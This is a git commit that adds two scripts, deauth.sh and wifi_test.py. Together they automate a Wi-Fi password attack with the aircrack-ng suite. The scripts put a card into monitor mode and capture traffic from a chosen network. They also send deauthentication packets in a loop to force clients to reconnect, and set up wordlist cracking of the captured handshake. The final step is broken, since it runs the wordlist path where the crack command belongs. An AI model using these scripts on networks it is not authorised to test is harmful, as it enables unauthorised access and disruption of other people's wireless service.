d79b95e2499efff54acf492c1fd0c4fd7beff3e3
Joseph Ingrassia <joseph.ingrassia@northwestern.edu>
2018-02-07 20:47:17 +0000

    final? of wifi test scripts

---
+++ deauth.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+while :
+do
+	read -p 'Enter number of deauth packets you want to send > ' deauth
+	read -p 'Enter BSSID > ' bssid
+	read -p 'Enter station ID from original terminal > ' mac
+	read -p 'Enter name of interface > ' card
+	aireplay-ng -0 $deauth -a $bssid -c $mac $card
+done
---
+++ wifi_test.py
@@ -0,0 +1,35 @@
+import os
+from os import system
+
+nic = input("Enter wifi interace name > ")
+setup = f"airmon-ng check kill && airmon-ng start {nic} && airmon-ng"
+
+system(setup)
+
+start = f'airodump-ng {nic}mon'
+
+print("\n", "*" * 40, """\nOnce desired network is found, press \033[1;34m CTRL-C \033[0;0m to stop airodump \n""", "*" * 40, "\n")
+input("Press enter to continue ...")
+
+system(start)
+
+bssid = input("Type selected bssid > ")
+channel = int(input("Enter channel number of selected bssid > "))
+location = input("File path for where you would like files saved \033[1;32;40m PLEASE INCLUDE NAME FOR FILE ie: /root/Desktop/apple \033[0;0m > ")
+
+
+os.system("gnome-terminal -e /root/wifi_hacking/deauth.sh")
+
+print("\n")
+input("Press enter to continue ...")
+
+airodump2 = f"airodump-ng -c {channel} --bssid {bssid} -w {location} {nic}mon"
+system(airodump2)
+
+print("We will now attempt to crack the wifi password \n")
+input("Press enter to continue...")
+
+wordlist = input("Enter file path for wordlist you wish to use > ")
+aircrack = f"aircrack-ng {location}-01.cap -w {wordlist}"
+
+system(wordlist)
